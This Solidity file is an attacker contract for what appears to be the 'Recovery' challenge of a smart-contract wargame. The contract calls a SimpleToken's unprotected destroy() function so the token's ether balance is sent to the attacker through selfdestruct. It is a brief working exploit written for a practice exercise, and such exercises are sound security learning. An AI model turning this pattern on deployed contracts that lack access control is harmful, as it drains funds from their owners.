// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Recovery.sol";

/// @title Recovery challenge attacker contract 
/// @notice This contract will be calling destroy() func of our SimpleToken contract in order 
/// to forcely send the ether balance it contains to us via selfdestruct.  
/// We will need to recompute the token address in the script and deploy the contract
/// with that as parameter.  

contract RecoveryAttack {

    SimpleToken simpleTokenContract;

    constructor(address payable _address) public{
        simpleTokenContract = SimpleToken(_address);

    }

    function callToDestroy() external{
        simpleTokenContract.destroy(address(this));
    }

    receive() external payable{

    }
}
